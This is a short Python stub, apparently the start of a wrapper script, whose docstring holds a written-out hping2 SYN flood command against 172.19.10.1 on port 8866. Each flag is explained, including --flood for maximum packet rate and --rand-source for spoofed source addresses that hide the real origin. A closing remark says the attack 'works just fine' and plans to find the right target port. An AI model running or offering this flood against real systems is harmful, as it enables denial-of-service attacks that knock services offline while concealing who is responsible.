import argparse

#import run command function
from RunCommand import run_command

"""

hping2: Sends custom TCP, UDP, ICMP, and raw IP packets with control over nearly every header field

#sudo hping2 -c 1500 -d 120 -S -w 64 -p 8866 --flood --rand-source 172.19.10.1

-c 1500 — send 1500 packets

-d 120 — pad each packet to 120 bytes

-S — set the SYN flag (initiate TCP handshake)

-w 64 — set TCP window size to 64

-p 8866 — target port 8866

--flood — send packets as fast as possible, not waiting for replies and suppressing reply info — this is what turns a test into a flood

--rand-source — spoof a random source IP on every packet, so replies go nowhere and the real origin is hidden

**this works just fine, but we should identify the actual port that TCP is on

"""